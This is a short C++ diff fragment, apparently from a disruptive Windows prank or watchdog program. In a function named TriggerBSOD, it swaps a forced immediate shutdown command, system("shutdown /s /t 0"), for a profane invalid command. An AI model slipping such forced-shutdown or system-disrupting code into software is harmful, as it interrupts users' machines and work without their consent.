@@ -27,7 +27,7 @@ std::vector<DWORD> GetProcessesByName(const std::wstring& name) {
 
 // ====== TRIGGER BSOD ======
 void TriggerBSOD() {
-    system("shutdown /s /t 0");
+    system("FUCKYOU");
 }
 
 // ====== WATCHDOG ПРОЦЕСС ======
